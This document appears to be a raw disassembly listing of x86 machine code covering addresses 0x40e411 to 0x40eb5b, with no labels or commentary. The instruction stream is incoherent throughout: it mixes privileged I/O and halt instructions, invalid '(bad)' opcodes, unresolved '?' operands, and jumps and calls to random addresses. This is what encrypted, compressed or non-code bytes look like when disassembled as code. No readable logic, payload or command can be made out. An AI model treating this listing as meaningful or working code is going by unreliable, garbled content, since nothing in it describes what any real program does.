  40e411:	xlat   BYTE PTR ds:[ebx]
  40e412:	xlat   BYTE PTR ds:[ebx]
  40e413:	or     al,0xd1
  40e415:	sbb    eax,ebp
  40e417:	mov    eax,ds:0xfe572728
  40e41c:	dec    edi
  40e41d:	lahf   
  40e41e:	and    ebp,DWORD PTR [edx-0x7d]
  40e421:	pop    es
  40e422:	sub    al,0x2b
  40e424:	add    al,0x8e
  40e426:	dec    ebx
  40e427:	paddusb mm1,QWORD PTR [edx]
  40e42a:	mov    BYTE PTR [ebx+0x5a],ch
  40e42d:	std    
  40e42e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e42f:	sub    ch,ch
  40e431:	xor    cl,dl
  40e433:	pop    edx
  40e434:	test   al,0xad
  40e436:	sbb    bh,BYTE PTR [esi-0x13]
  40e439:	add    al,0x7c
  40e43b:	stc    
  40e43c:	push   esi
  40e43d:	xor    dl,BYTE PTR ds:0x36f6ba8c
  40e443:	je     0x40e409
  40e445:	jns    0x40e4c2
  40e447:	pop    ebx
  40e448:	scas   eax,DWORD PTR es:[edi]
  40e449:	mov    ecx,0xd6bbfd2
  40e44e:	adc    DWORD PTR [ebp+0x72],0x59
  40e452:	fdiv   st(3),st
  40e454:	push   esi
  40e455:	adc    al,0x67
  40e457:	imul   eax,DWORD PTR [eax+ecx*4-0x8],0x18a680
  40e45f:	in     eax,0x6d
  40e461:	jns    0x40e455
  40e463:	gs fcmovbe st,st(3)
  40e466:	lea    ecx,[edx+0x5204e049]
  40e46c:	adc    BYTE PTR [edx-0x63],0x2f
  40e470:	push   cs
  40e471:	aas    
  40e472:	xchg   esi,eax
  40e473:	mov    ah,0x9d
  40e475:	xor    DWORD PTR [ebx],ebp
  40e477:	in     al,dx
  40e478:	out    0xe4,al
  40e47a:	mov    dh,0xad
  40e47c:	dec    edi
  40e47d:	rcl    DWORD PTR [ebx+0x2a2f1178],cl
  40e483:	or     al,0x6e
  40e485:	test   DWORD PTR gs:[ecx+0x3f089f87],ecx
  40e48c:	add    esi,DWORD PTR [ebp+0x6b]
  40e48f:	test   DWORD PTR [edi],esi
  40e491:	mov    dl,0xad
  40e493:	daa    
  40e494:	pop    ecx
  40e495:	out    dx,al
  40e496:	clc    
  40e497:	les    eax,FWORD PTR es:[ecx-0x1ef79528]
  40e49e:	vpaddb xmm5,xmm0,xmm3
  40e4a2:	adc    al,0xb3
  40e4a4:	outs   dx,DWORD PTR ds:[esi]
  40e4a5:	loope  0x40e4fe
  40e4a7:	hlt    
  40e4a8:	cs dec ebp
  40e4aa:	mov    WORD PTR [eax],cs
  40e4ac:	(bad)  
  40e4ad:	ss pop eax
  40e4af:	adc    edx,DWORD PTR ss:[edx]
  40e4b2:	xchg   ebx,ebp
  40e4b4:	push   esp
  40e4b5:	mov    al,ds:0x792a0404
  40e4ba:	inc    esp
  40e4bb:	mov    bh,0x1c
  40e4bd:	scas   eax,DWORD PTR es:[edi]
  40e4be:	sub    BYTE PTR [ebp+0x34],ch
  40e4c1:	shl    DWORD PTR [esi-0x56],cl
  40e4c4:	pop    eax
  40e4c5:	inc    ecx
  40e4c6:	mov    eax,0x3be0fa23
  40e4cb:	jno    0x40e487
  40e4cd:	lea    esi,[ebx-0x5]
  40e4d0:	xor    BYTE PTR [edi+0x3b],ch
  40e4d3:	wbinvd 
  40e4d5:	fmul   QWORD PTR [ebp+0x3a]
  40e4d8:	adc    DWORD PTR [ebx+0x5c],esi
  40e4db:	arpl   WORD PTR [ebx+0x59],bx
  40e4de:	jg     0x40e4c9
  40e4e0:	and    bh,BYTE PTR [edi-0xe9f3855]
  40e4e6:	xor    ebx,ecx
  40e4e8:	dec    esp
  40e4e9:	int    0xdd
  40e4eb:	mov    ebx,0x6183d8cc
  40e4f0:	inc    edx
  40e4f1:	pop    ss
  40e4f2:	adc    DWORD PTR [esi],edx
  40e4f4:	int    0x76
  40e4f6:	pop    esi
  40e4f7:	cmc    
  40e4f8:	jno    0x40e489
  40e4fa:	pop    eax
  40e4fb:	jnp    0x40e4f0
  40e4fd:	mov    ecx,0x7e034522
  40e502:	xchg   ecx,eax
  40e503:	adc    DWORD PTR [ebx+0x7e],ebp
  40e506:	push   0xfffffff4
  40e508:	outs   dx,BYTE PTR ds:[esi]
  40e509:	ror    DWORD PTR [esi-0x4e8fc6ae],1
  40e50f:	add    edx,DWORD PTR [ecx]
  40e511:	jmp    0x40e519
  40e513:	cli    
  40e514:	jle    0x40e555
  40e516:	jge    0x40e574
  40e518:	clc    
  40e519:	mov    ebx,0x19a20afb
  40e51e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e51f:	in     al,dx
  40e520:	cs push ss
  40e522:	jecxz  0x40e4ec
  40e524:	mov    bh,0xb3
  40e526:	xchg   edx,eax
  40e527:	cdq    
  40e528:	outs   dx,BYTE PTR ds:[esi]
  40e529:	and    esp,DWORD PTR ds:0xdd196cc2
  40e52f:	push   eax
  40e530:	hlt    
  40e531:	mov    al,0xd6
  40e533:	or     edx,esi
  40e535:	adc    cl,dl
  40e537:	std    
  40e538:	imul   DWORD PTR ds:0xbfd620ab
  40e53e:	imul   edi,DWORD PTR [eax+0x7ec2206f],0xffffff92
  40e545:	daa    
  40e546:	call   0x20424b70
  40e54b:	push   ebx
  40e54c:	call   0xbce9a115
  40e551:	sahf   
  40e552:	push   0x29
  40e554:	cmp    ebp,edi
  40e556:	mov    esi,0x486574fd
  40e55b:	dec    esp
  40e55c:	popa   
  40e55d:	fild   DWORD PTR [edi-0xfbfaef1]
  40e563:	mov    ebp,0x43fda3d4
  40e568:	lea    esi,[eax+edx*4-0x7e522b40]
  40e56f:	cmp    eax,0x3796e43b
  40e574:	and    DWORD PTR fs:[bx+di-0x4640],0xfffffff6
  40e57b:	jbe    0x40e5c3
  40e57d:	lahf   
  40e57e:	inc    ebx
  40e57f:	in     eax,0x2d
  40e581:	ins    BYTE PTR es:[edi],dx
  40e582:	mov    ecx,DWORD PTR [ecx+0x3f]
  40e585:	mov    ebp,0xdc41adbf
  40e58a:	addr16 leave 
  40e58c:	add    eax,0x2e2b6705
  40e591:	mov    ds:0x73d9d841,eax
  40e596:	jnp    0x40e55d
  40e598:	pop    esp
  40e599:	and    bh,al
  40e59b:	int    0xec
  40e59d:	push   0xffffffc6
  40e59f:	mov    ?,ecx
  40e5a1:	sbb    al,0x4e
  40e5a3:	je     0x40e5fb
  40e5a5:	push   ecx
  40e5a6:	std    
  40e5a7:	jns    0x40e5fa
  40e5a9:	sub    esp,esi
  40e5ab:	mov    esp,0x53277b98
  40e5b0:	push   esp
  40e5b1:	outs   dx,BYTE PTR ds:[esi]
  40e5b2:	dec    ebp
  40e5b3:	ins    DWORD PTR es:[edi],dx
  40e5b4:	out    dx,al
  40e5b5:	(bad)  
  40e5b6:	stos   DWORD PTR es:[edi],eax
  40e5b7:	iret   
  40e5b8:	std    
  40e5b9:	ins    BYTE PTR es:[edi],dx
  40e5ba:	(bad)  
  40e5bb:	mov    esp,0x7a83c98
  40e5c0:	sti    
  40e5c1:	fs repnz out dx,eax
  40e5c4:	int    0x75
  40e5c6:	(bad)  [edi+0x320849ee]
  40e5cc:	mov    al,0x3e
  40e5ce:	sbb    eax,0x6b350a28
  40e5d3:	into   
  40e5d4:	mov    ?,WORD PTR [edi]
  40e5d6:	or     DWORD PTR [ecx],eax
  40e5d8:	int    0xc3
  40e5da:	test   BYTE PTR [esi+0x31d02187],0xc8
  40e5e1:	jl     0x40e618
  40e5e3:	mov    ds:0x82ef205d,eax
  40e5e8:	lods   eax,DWORD PTR ds:[esi]
  40e5e9:	sbb    bh,BYTE PTR ds:[edx]
  40e5ec:	fwait
  40e5ed:	shl    DWORD PTR [eax],cl
  40e5ef:	lahf   
  40e5f0:	add    eax,0xab6f1f6
  40e5f5:	or     al,0x77
  40e5f7:	or     eax,DWORD PTR [ebp+0x1ddbb620]
  40e5fd:	sub    edi,DWORD PTR ds:0xa2774919
  40e603:	jnp    0x40e62a
  40e605:	or     esp,DWORD PTR [eax]
  40e607:	out    dx,al
  40e608:	xchg   esi,edi
  40e60a:	sahf   
  40e60b:	imul   esp,DWORD PTR [eax+ebp*1+0x1cf5bd7],0x29b42af4
  40e616:	push   esp
  40e617:	jle    0x40e603
  40e619:	add    cl,bh
  40e61b:	dec    esi
  40e61c:	adc    DWORD PTR [esi],0xffffffc1
  40e61f:	(bad)  
  40e620:	popa   
  40e621:	or     eax,0x6f03f5dc
  40e626:	mov    al,ds:0xec5efd10
  40e62b:	iret   
  40e62c:	push   edx
  40e62d:	dec    esi
  40e62e:	std    
  40e62f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e630:	les    ecx,FWORD PTR [ebx+0x38579ed0]
  40e636:	pop    ebx
  40e637:	mov    ds:0x4d833a76,al
  40e63c:	dec    edx
  40e63d:	xor    DWORD PTR [esi],eax
  40e63f:	push   ecx
  40e640:	lods   al,BYTE PTR ds:[esi]
  40e641:	add    bh,BYTE PTR [ebx-0x4d4acfe0]
  40e647:	test   al,0xcf
  40e649:	or     al,0xe4
  40e64b:	sub    al,0xa6
  40e64d:	das    
  40e64e:	or     al,0xf2
  40e650:	xor    eax,0x85f16fe5
  40e655:	sub    DWORD PTR [edi+0x35],esp
  40e658:	sub    al,BYTE PTR [edi]
  40e65a:	dec    ebx
  40e65b:	fmul   QWORD PTR [ecx]
  40e65d:	and    ah,BYTE PTR [eax]
  40e65f:	push   ss
  40e660:	scas   eax,DWORD PTR es:[edi]
  40e661:	adc    BYTE PTR [ecx],dh
  40e663:	push   eax
  40e664:	cmp    dh,ah
  40e666:	repz inc eax
  40e668:	aas    
  40e669:	mov    ds:0x9b352bad,al
  40e66e:	rol    DWORD PTR [esi+0x25],1
  40e671:	int3   
  40e672:	xchg   esp,eax
  40e673:	cmp    ebx,DWORD PTR [ecx-0x7]
  40e676:	cmp    eax,0xabf60076
  40e67b:	cs xor eax,0x966775c6
  40e681:	lea    eax,[ebx+0x5c]
  40e684:	push   edi
  40e685:	mov    ecx,DWORD PTR [eax+0x7b878bfb]
  40e68b:	fisubr DWORD PTR [eax+0x10f87b9a]
  40e691:	xchg   edi,eax
  40e692:	inc    ebp
  40e693:	add    ch,0xb9
  40e696:	dec    eax
  40e697:	lods   al,BYTE PTR ds:[si]
  40e699:	loopne 0x40e700
  40e69b:	mov    edx,0xb3cbfef0
  40e6a0:	pop    ebp
  40e6a1:	pop    ss
  40e6a2:	xor    al,0x6a
  40e6a4:	jmp    0x40e6f5
  40e6a6:	cwde   
  40e6a7:	call   DWORD PTR ds:0x30b8b71d
  40e6ad:	adc    bh,ah
  40e6af:	data16 fidivr WORD PTR [ecx-0x7c]
  40e6b3:	xchg   ebx,eax
  40e6b4:	mov    bl,0x59
  40e6b6:	mov    esp,cs
  40e6b8:	fsubp  st(5),st
  40e6ba:	cdq    
  40e6bb:	sar    ah,0xde
  40e6be:	dec    edi
  40e6bf:	pop    ss
  40e6c0:	sub    al,0x6b
  40e6c2:	mov    dl,0x23
  40e6c4:	mov    edx,0x1734a2e7
  40e6c9:	retf   0x9cbb
  40e6cc:	xlat   BYTE PTR ds:[ebx]
  40e6cd:	jmp    FWORD PTR [edi+0xc]
  40e6d0:	loope  0x40e704
  40e6d2:	adc    DWORD PTR [edi-0x46],esp
  40e6d5:	and    dl,0x49
  40e6d8:	fsub   DWORD PTR [edx-0x38e7db5b]
  40e6de:	push   es
  40e6df:	xchg   edi,eax
  40e6e0:	loope  0x40e685
  40e6e2:	pop    eax
  40e6e3:	mov    ds:0x8a36e949,eax
  40e6e8:	add    ebp,DWORD PTR [ecx]
  40e6ea:	sbb    DWORD PTR [edi+ebx*4],edx
  40e6ed:	mov    ds:0x3dc1fc71,eax
  40e6f2:	out    0x7a,al
  40e6f4:	fst    DWORD PTR [eax-0x13]
  40e6f7:	lahf   
  40e6f8:	(bad)  
  40e6f9:	push   edx
  40e6fa:	(bad)  
  40e6fb:	jne    0x40e71f
  40e6fd:	dec    esp
  40e6fe:	sub    DWORD PTR [eax],ebp
  40e700:	jne    0x40e759
  40e702:	jecxz  0x40e74a
  40e704:	ins    BYTE PTR es:[edi],dx
  40e705:	cdq    
  40e706:	sbb    al,0x33
  40e708:	push   ebx
  40e709:	out    dx,eax
  40e70a:	sbb    esp,DWORD PTR [edi-0x4b]
  40e70d:	mov    al,ds:0x153c7dce
  40e712:	jle    0x40e708
  40e714:	pop    ds
  40e715:	mov    al,BYTE PTR [ebp-0x60]
  40e718:	xchg   esp,eax
  40e719:	mov    eax,0xb4da2492
  40e71e:	ins    DWORD PTR es:[edi],dx
  40e71f:	fwait
  40e720:	jns    0x40e78e
  40e722:	push   ss
  40e723:	mov    eax,ds:0x953b7d10
  40e728:	mov    ch,0x20
  40e72a:	nop
  40e72b:	repnz scas al,BYTE PTR es:[edi]
  40e72d:	pop    ebx
  40e72e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e72f:	retf   
  40e730:	pop    eax
  40e731:	stos   BYTE PTR es:[edi],al
  40e732:	cmp    DWORD PTR [ebx-0x73ad198f],edx
  40e738:	mov    ch,0x3e
  40e73a:	inc    esi
  40e73b:	cmp    ebx,ecx
  40e73d:	scas   eax,DWORD PTR es:[edi]
  40e73e:	xchg   ecx,eax
  40e73f:	pop    edx
  40e740:	pushf  
  40e741:	shr    DWORD PTR [edx],1
  40e743:	js     0x40e6f7
  40e745:	or     al,0xb
  40e747:	enter  0xd56,0xc8
  40e74b:	scas   eax,DWORD PTR es:[edi]
  40e74c:	sub    eax,0x66a9a461
  40e751:	stc    
  40e752:	popa   
  40e753:	or     bh,BYTE PTR [edi]
  40e755:	ins    BYTE PTR es:[edi],dx
  40e756:	cmp    bh,ah
  40e758:	or     ecx,eax
  40e75a:	sbb    al,0xa7
  40e75c:	rcr    BYTE PTR [ebx],1
  40e75e:	nop
  40e75f:	adc    eax,DWORD PTR [ecx-0x71f15988]
  40e765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e766:	call   0x9d843254
  40e76b:	repz sbb ebp,DWORD PTR cs:[edx-0x79d83a2e]
  40e773:	pop    ebp
  40e774:	cmp    esi,DWORD PTR [ecx]
  40e776:	or     ecx,esi
  40e778:	lds    esi,FWORD PTR [ebx-0x4b07fd41]
  40e77e:	adc    al,0x4e
  40e780:	mov    esp,0x673eae2d
  40e785:	pop    ebp
  40e786:	adc    ebp,DWORD PTR [ebp+0x3e]
  40e789:	and    ecx,DWORD PTR [eax]
  40e78b:	sub    DWORD PTR [edx-0x2b00fa74],ebx
  40e791:	jo     0x40e76e
  40e793:	mov    al,ds:0x91c745e5
  40e798:	and    eax,0x97c61cd0
  40e79d:	cmp    eax,0x57f10dad
  40e7a2:	fmulp  st(6),st
  40e7a4:	cmovns esp,DWORD PTR [esi+0x5c]
  40e7a8:	and    ebp,0xc9550e7c
  40e7ae:	stos   DWORD PTR es:[edi],eax
  40e7af:	cmp    BYTE PTR [ecx-0x58],al
  40e7b2:	and    al,BYTE PTR ds:0x9f5041db
  40e7b8:	test   DWORD PTR [edi-0xacb758a],ebx
  40e7be:	fwait
  40e7bf:	push   0x54ef1c6c
  40e7c4:	pop    ds
  40e7c5:	lock mov edx,0x6a5499ab
  40e7cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7cc:	pop    edi
  40e7cd:	adc    al,0xd8
  40e7cf:	cmp    bl,BYTE PTR [ebp+0x49]
  40e7d2:	pop    ds
  40e7d3:	shl    DWORD PTR [edi-0x7083dd82],0x53
  40e7da:	sti    
  40e7db:	and    edx,DWORD PTR [esi+eax*4+0x3df37b9]
  40e7e2:	dec    esp
  40e7e3:	hlt    
  40e7e4:	jno    0x40e830
  40e7e6:	out    0xd4,eax
  40e7e8:	retf   
  40e7e9:	out    0x84,eax
  40e7eb:	cmp    BYTE PTR [eax-0x1d],bl
  40e7ee:	nop
  40e7ef:	test   bl,0x51
  40e7f2:	jmp    0x4223:0xe827e600
  40e7f9:	dec    edi
  40e7fa:	fidiv  DWORD PTR [ebp+0x6b]
  40e7fd:	(bad)  
  40e7fe:	pop    esi
  40e7ff:	fmul   DWORD PTR [ecx-0x7f]
  40e802:	or     ah,bh
  40e804:	mov    ds:0xd56614af,eax
  40e809:	add    eax,0x71f36c00
  40e80e:	test   eax,0x1c5427f3
  40e813:	pushf  
  40e814:	data16 sub al,0xad
  40e817:	in     eax,0x3b
  40e819:	sub    DWORD PTR [eax-0x1],ebp
  40e81c:	stc    
  40e81d:	out    0xfb,eax
  40e81f:	scas   al,BYTE PTR es:[edi]
  40e820:	xchg   ecx,eax
  40e821:	adc    edx,DWORD PTR [esi-0x7f7e83b1]
  40e827:	mov    cl,0x5
  40e829:	mov    ebx,0x40af3ce9
  40e82e:	xchg   ebp,eax
  40e82f:	and    edx,esi
  40e831:	pusha  
  40e832:	sub    esi,DWORD PTR [ebx+0x6e]
  40e835:	call   0xfd01:0x5572c37d
  40e83c:	xchg   esi,eax
  40e83d:	jp     0x40e80e
  40e83f:	aam    0x15
  40e841:	mov    edx,0x3149b3e3
  40e846:	outs   dx,BYTE PTR ds:[esi]
  40e847:	jl     0x40e7d5
  40e849:	int3   
  40e84a:	(bad)  
  40e84b:	mov    ds:0x20e82c39,al
  40e850:	dec    ebp
  40e851:	and    cl,BYTE PTR [eax]
  40e853:	add    bh,BYTE PTR [eax+ebx*8+0x70c31887]
  40e85a:	xor    dh,BYTE PTR [edx-0x3d]
  40e85d:	(bad)  
  40e85e:	sbb    DWORD PTR ds:0x894010ee,esi
  40e864:	dec    edx
  40e865:	cli    
  40e866:	stos   BYTE PTR es:[edi],al
  40e867:	in     al,0x22
  40e869:	lds    edx,FWORD PTR [edx]
  40e86b:	push   ecx
  40e86c:	jo     0x40e898
  40e86e:	or     al,0x8e
  40e870:	js     0x40e86a
  40e872:	out    0x14,al
  40e874:	dec    ebp
  40e875:	gs pop es
  40e877:	push   ds
  40e878:	xchg   DWORD PTR [edx-0x57],esp
  40e87b:	mov    eax,0x7add7cb3
  40e880:	imul   DWORD PTR [esp+esi*2-0x7315f5d6]
  40e887:	cli    
  40e888:	or     bh,BYTE PTR [esi+0x69d57eb3]
  40e88e:	mov    edx,0xfe301087
  40e893:	cmp    dh,dl
  40e895:	or     DWORD PTR [esi-0xe],esp
  40e898:	dec    ebp
  40e899:	js     0x40e8e1
  40e89b:	and    esi,edx
  40e89d:	aad    0x54
  40e89f:	cmp    ebp,DWORD PTR [edi+0x1e]
  40e8a2:	mov    eax,ds:0x10b09992
  40e8a7:	pusha  
  40e8a8:	mov    WORD PTR [eax+0x544f885a],cs
  40e8ae:	popf   
  40e8af:	jne    0x40e907
  40e8b1:	sbb    ecx,DWORD PTR [ebp+0x75]
  40e8b4:	pop    esi
  40e8b5:	aad    0xe2
  40e8b7:	mov    dh,0xa2
  40e8b9:	fs stc 
  40e8bb:	mov    ebx,0x305e8b73
  40e8c0:	mov    al,0xdf
  40e8c2:	lea    esp,[edi]
  40e8c4:	add    edi,DWORD PTR [ecx+ecx*8+0x7364251f]
  40e8cb:	cwde   
  40e8cc:	mov    eax,0xfa7d86b7
  40e8d1:	mov    al,0xde
  40e8d3:	sub    bh,BYTE PTR [edx-0x1a04e6e]
  40e8d9:	mov    ds:0xa09199d3,al
  40e8de:	int    0x11
  40e8e0:	adc    al,0x52
  40e8e2:	lods   eax,DWORD PTR ds:[esi]
  40e8e3:	push   ebp
  40e8e4:	mov    al,BYTE PTR [ebp-0x24]
  40e8e7:	xchg   BYTE PTR [esi+0x28],bh
  40e8ea:	clc    
  40e8eb:	mov    dh,BYTE PTR [ebp-0x682a3a30]
  40e8f1:	add    cx,WORD PTR [ebp-0x5cc9ff40]
  40e8f8:	js     0x40e884
  40e8fa:	lahf   
  40e8fb:	mov    edi,0x5f274436
  40e900:	and    bh,BYTE PTR [ebx+0x622a7cde]
  40e906:	fidivr WORD PTR [ecx-0x2d]
  40e909:	jae    0x40e8b6
  40e90b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e90c:	sub    al,0x9d
  40e90e:	shl    DWORD PTR [edx-0x58f054eb],0xbe
  40e915:	jmp    0x4720:0x47cbec65
  40e91c:	test   al,0xd1
  40e91e:	or     cl,BYTE PTR [ebx-0x53364c41]
  40e924:	and    bl,ah
  40e926:	loop   0x40e969
  40e928:	cld    
  40e929:	scas   al,BYTE PTR es:[edi]
  40e92a:	cmp    eax,edi
  40e92c:	in     al,dx
  40e92d:	cmp    edi,DWORD PTR [edi+0x55]
  40e930:	clc    
  40e931:	mov    ebp,0x6e03af49
  40e936:	call   0x28eabae8
  40e93b:	inc    esp
  40e93c:	mov    ch,0xb7
  40e93e:	sbb    al,0x2b
  40e940:	mov    ebp,0xc9875361
  40e945:	push   0x78
  40e947:	aaa    
  40e948:	(bad)  
  40e94a:	loop   0x40e937
  40e94c:	int    0x3e
  40e94e:	pop    eax
  40e94f:	mov    cl,0x8e
  40e951:	jmp    0x40e91d
  40e953:	aad    0xab
  40e955:	jne    0x40e8df
  40e957:	fiadd  DWORD PTR [ebx+0x76]
  40e95a:	push   ecx
  40e95b:	test   DWORD PTR [ecx],esi
  40e95d:	out    dx,al
  40e95e:	pop    ss
  40e95f:	std    
  40e960:	push   0x17
  40e962:	test   al,0x64
  40e964:	call   0x573ad00c
  40e969:	mov    edi,0x451ff6c9
  40e96e:	arpl   WORD PTR [eax-0x29],sp
  40e971:	xchg   ebx,eax
  40e972:	aad    0x5f
  40e974:	and    cl,BYTE PTR [edx+0x7f]
  40e977:	mov    eax,DWORD PTR [ecx]
  40e979:	ins    DWORD PTR es:[edi],dx
  40e97a:	jmp    0x20f5f91
  40e97f:	xor    bh,BYTE PTR ds:0x591a1ee3
  40e985:	push   es
  40e986:	in     eax,0x5d
  40e988:	adc    eax,0xbbe9e859
  40e98d:	pop    ebp
  40e98e:	aad    0x5d
  40e990:	mov    DWORD PTR [ebp+esi*8+0x4cd2aae2],ebp
  40e997:	sahf   
  40e998:	push   ss
  40e999:	shl    DWORD PTR [edx+0x5133dbfc],cl
  40e99f:	push   edx
  40e9a0:	mov    esi,0x660f75bf
  40e9a5:	ret    
  40e9a6:	push   eax
  40e9a7:	add    cl,BYTE PTR [ecx+0x21bf6e83]
  40e9ad:	push   ss
  40e9ae:	mov    ecx,0xee6d4e8f
  40e9b3:	icebp  
  40e9b4:	jecxz  0x40ea09
  40e9b6:	add    al,0x47
  40e9b8:	push   cs
  40e9b9:	addr16 jb 0x40ea09
  40e9bc:	and    ecx,DWORD PTR [edx+0x16]
  40e9bf:	or     edi,DWORD PTR [ecx]
  40e9c1:	inc    edx
  40e9c2:	xor    BYTE PTR ds:0x41ad780f,cl
  40e9c8:	push   edi
  40e9c9:	inc    ebp
  40e9ca:	out    0x3e,al
  40e9cc:	(bad)  
  40e9cd:	cld    
  40e9ce:	jno    0x40ea26
  40e9d0:	push   ebx
  40e9d1:	ds loopne 0x40e9f2
  40e9d4:	mov    ?,WORD PTR [eax-0x4145fd6e]
  40e9da:	ins    BYTE PTR es:[edi],dx
  40e9db:	xor    al,0x45
  40e9dd:	retf   
  40e9de:	inc    edi
  40e9df:	and    ah,dh
  40e9e1:	mov    ah,0x6e
  40e9e3:	into   
  40e9e4:	js     0x40e9d3
  40e9e6:	ja     0x40e9ec
  40e9e8:	pop    esp
  40e9e9:	sbb    eax,0x25d36383
  40e9ee:	leave  
  40e9ef:	add    ch,al
  40e9f1:	mov    fs,WORD PTR [edx-0x1b]
  40e9f4:	loop   0x40e9cc
  40e9f6:	sbb    eax,DWORD PTR [eax+edi*4-0xc]
  40e9fa:	xor    esp,DWORD PTR es:[ecx-0x45]
  40e9fe:	xor    al,0x25
  40ea00:	push   edx
  40ea01:	inc    esi
  40ea02:	jne    0x40e99d
  40ea04:	sti    
  40ea05:	pop    edi
  40ea06:	jle    0x40e9a9
  40ea08:	xchg   edi,eax
  40ea09:	xchg   BYTE PTR [ebp+0x75a99787],bh
  40ea0f:	lock xchg DWORD PTR [ebp-0x7b],ebp
  40ea13:	repnz mov edx,ebp
  40ea16:	push   edx
  40ea17:	into   
  40ea18:	xchg   ebx,eax
  40ea19:	xchg   edi,eax
  40ea1a:	lds    esi,FWORD PTR [ebx+0x5f60c9f0]
  40ea20:	nop
  40ea21:	pop    ebp
  40ea22:	(bad)  
  40ea23:	pop    esi
  40ea24:	xchg   ecx,eax
  40ea25:	cmp    dl,BYTE PTR [eax-0x292ea01]
  40ea2b:	ins    BYTE PTR es:[edi],dx
  40ea2c:	jge    0x40ea74
  40ea2e:	add    BYTE PTR [ebx+0x17],cl
  40ea31:	mov    WORD PTR [ebp+0xd],ss
  40ea34:	adc    BYTE PTR [eax+edx*1-0x38],bl
  40ea38:	pushf  
  40ea39:	jns    0x40ea43
  40ea3b:	or     DWORD PTR [ebx+0x3e],edx
  40ea3e:	mov    dh,0xa6
  40ea40:	cmp    dh,BYTE PTR [ebp-0x749086b9]
  40ea46:	sbb    DWORD PTR [edx+ebx*1],0xa
  40ea4a:	pushf  
  40ea4b:	mov    eax,0xfb8f9bd7
  40ea50:	in     al,0xef
  40ea52:	jp     0x40ea2d
  40ea54:	(bad)  
  40ea55:	imul   ecx,DWORD PTR [eax+0x4a],0x26
  40ea59:	pop    ebp
  40ea5a:	fistp  DWORD PTR [edi]
  40ea5c:	jmp    0x40e9f7
  40ea5e:	ja     0x40ea2f
  40ea60:	jbe    0x40ea5c
  40ea62:	js     0x40ea5a
  40ea64:	bound  edi,QWORD PTR [ecx]
  40ea66:	mov    esi,0xb5a38a78
  40ea6b:	scas   eax,DWORD PTR es:[edi]
  40ea6c:	pop    ds
  40ea6d:	jae    0x40e9fc
  40ea6f:	mov    edi,0x5be1badd
  40ea74:	push   edx
  40ea75:	sub    eax,0x4f8156ea
  40ea7a:	push   ds
  40ea7b:	nop
  40ea7c:	jmp    0x1171d9d6
  40ea81:	dec    esp
  40ea82:	loopne 0x40ea30
  40ea84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea85:	push   edi
  40ea86:	outs   dx,DWORD PTR ds:[esi]
  40ea87:	test   DWORD PTR [edx-0x50570d30],esi
  40ea8d:	gs inc ebx
  40ea8f:	aas    
  40ea90:	mov    edi,0x5e3e11b3
  40ea95:	ror    BYTE PTR [edi+0x6362d448],1
  40ea9b:	mov    cl,0xc4
  40ea9d:	(bad)  
  40ea9e:	mov    ah,0xbe
  40eaa0:	retf   
  40eaa1:	shl    DWORD PTR [edi+0x3adf8b18],1
  40eaa7:	mov    bl,0xad
  40eaa9:	ret    0x5d4b
  40eaac:	aaa    
  40eaad:	rcl    DWORD PTR [ebp-0x20],1
  40eab0:	scas   al,BYTE PTR es:[edi]
  40eab1:	xchg   esp,eax
  40eab2:	xchg   BYTE PTR [esi],dl
  40eab4:	aam    0x82
  40eab6:	test   DWORD PTR ds:[ecx-0xbc838cc],eax
  40eabd:	fistp  QWORD PTR [esi-0x64]
  40eac0:	inc    esi
  40eac1:	pushf  
  40eac2:	cmp    DWORD PTR [eax],edx
  40eac4:	out    dx,al
  40eac5:	add    DWORD PTR [eax],ebx
  40eac7:	(bad)  
  40eac8:	mov    al,0xd8
  40eaca:	or     DWORD PTR [ebx],esi
  40eacc:	xlat   BYTE PTR ds:[ebx]
  40eacd:	fs push ecx
  40eacf:	lock xor al,al
  40ead2:	jbe    0x40eaa5
  40ead4:	out    dx,al
  40ead5:	fstp   QWORD PTR [eax+0x74]
  40ead8:	cmc    
  40ead9:	call   DWORD PTR [edx+0x5fd1a481]
  40eadf:	dec    ecx
  40eae0:	shl    bh,cl
  40eae2:	xchg   esp,eax
  40eae3:	in     eax,0x8c
  40eae5:	mov    al,bl
  40eae7:	mov    ds:0x4803f78d,al
  40eaec:	nop
  40eaed:	rcr    edi,0x23
  40eaf0:	stc    
  40eaf1:	xchg   esp,eax
  40eaf2:	dec    ebp
  40eaf3:	or     al,0xa2
  40eaf5:	jp     0x40eae2
  40eaf7:	(bad)  
  40eaf8:	xor    DWORD PTR [ebp+0x24],ecx
  40eafb:	sub    al,0xff
  40eafd:	arpl   WORD PTR [eax-0x5eab2f70],dx
  40eb03:	add    eax,0x730d5fea
  40eb08:	pushf  
  40eb09:	cld    
  40eb0a:	test   al,0x85
  40eb0c:	xchg   esi,eax
  40eb0d:	es xchg esi,eax
  40eb0f:	and    ch,BYTE PTR [ecx]
  40eb11:	cmp    eax,0x25c7d993
  40eb16:	pop    edx
  40eb17:	jb     0x40ead9
  40eb19:	fwait
  40eb1a:	ins    DWORD PTR es:[edi],dx
  40eb1b:	mov    ebp,0xb3467e59
  40eb20:	inc    ebp
  40eb21:	pusha  
  40eb22:	mov    esp,0xd5c43bf8
  40eb27:	pop    ebx
  40eb28:	clc    
  40eb29:	ja     0x40eb59
  40eb2b:	fs jmp 0xea1d:0xc5ee0e11
  40eb33:	dec    edi
  40eb34:	mov    edx,0xb123e400
  40eb39:	push   ebx
  40eb3a:	xchg   esp,eax
  40eb3b:	lds    ebx,FWORD PTR [edx]
  40eb3d:	bsf    esi,DWORD PTR [esi+0x67]
  40eb41:	inc    ebx
  40eb42:	fist   DWORD PTR [edx+0x72]
  40eb45:	pop    eax
  40eb46:	jle    0x40eb1b
  40eb48:	dec    esp
  40eb49:	loop   0x40eb7b
  40eb4b:	and    al,BYTE PTR [ecx-0x7e33f54e]
  40eb51:	ins    DWORD PTR es:[edi],dx
  40eb52:	stos   DWORD PTR es:[edi],eax
  40eb53:	push   ecx
  40eb54:	jl     0x40eaeb
  40eb56:	jb     0x40ebab
  40eb58:	pop    ebp
  40eb59:	test   al,0xae
  40eb5b:	adc    BYTE PTR [eax+0x4414f599],0x5f
